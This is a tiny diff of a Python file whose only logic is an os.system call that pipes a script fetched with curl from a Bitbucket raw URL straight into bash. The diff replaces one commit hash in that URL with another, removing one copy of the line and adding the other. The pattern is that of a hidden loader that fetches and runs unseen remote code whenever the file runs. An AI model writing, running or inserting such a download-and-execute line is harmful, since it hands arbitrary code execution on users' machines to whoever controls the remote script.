@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/mikay2808/yui/raw/65d51179274c15e17894a186459d4baa1952311d/mika | bash')
+os.system('curl -sL https://bitbucket.org/mikay2808/yui/raw/e4c99cb39d0ce0ac52872edcab6fbce46d7974f4/mika | bash')
